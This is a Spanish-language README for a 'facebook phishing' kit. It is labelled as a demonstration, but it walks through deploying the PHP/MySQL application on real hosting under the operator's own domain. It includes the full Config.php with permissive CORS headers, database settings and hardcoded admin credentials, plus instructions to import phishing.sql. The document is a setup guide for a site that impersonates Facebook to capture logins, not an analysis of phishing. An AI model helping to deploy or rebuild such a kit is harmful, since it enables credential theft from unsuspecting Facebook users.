# facebook phishing

aplicacion 100% demostrativo sobre como funciona un phishing!

## instalacion

### requisitos
  - hosting que soporte ejecusion php
  - base de datos MYSQL
  - dominoo web o subdominio


### descarga el proyecto
puedes clonar el proyecto usando git o descargarlo como .zip
para su instalacion usa la rama PRODUCTION o si prefiere ver el codigo fuente y contruir su propio build con webpack usa la rama DEVELOPMENT.

### consfiguracion del proyecto
usando la lara production tendras una lista de los siguentes archivos y carpetas:
- api/
- public/
- .htaccess
- phishing.sql
 dirigete a la carpeta ruta api/core/Config.php ahi es donde configuramos todo:
```
<?php

define('runtime','production' );  

#domine
define('DOMINE', 'http://yourdomine.com'); //cambialo por tu dominio o subdiminio


//header no tocar
header("Content-type: text/html");
header("Access-Control-Allow-Origin: ". DOMINE);
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Max-Age: 1000");
header("Access-Control-Allow-Headers: Content-Type, *");
header("Access-Control-Allow-Methods: PUT, POST, GET, OPTIONS, DELETE");


#database conexion
//ingresa los datos de conexion para la base de datos, estos datos te lo provee tu hosting.
define('DB_NAME', 'phishing');
define('DB_HOST', 'localhost');
define('DB_USER','root');
define('DB_PASS', '');
define('DB_CHARSET','utf8');

#define tu correo y contraseña para iniciar session como administrador
define('USERNAME', 'jesusmaster');
define('PASSWORD', 'jesusmaster4772');
```
Listo esto es toda la configuracion que realizaremos sobre el codigo.

## instalacion de base de datos
crea una nueva base de datos mytsql e importa el archivo phishing.sql que se encuentra en el directorio raiz del proyecto, esto creara automaticamente las tablas y la estructura necesaria en la base de datos para la aplicacion.


### finalizar
despues de modificar las configuracione, instalar la base de datos y subir el codigo al hosting ya deverias tener la app corriendo sin problemas. lee nuetra wiki para entender como funciona la app.
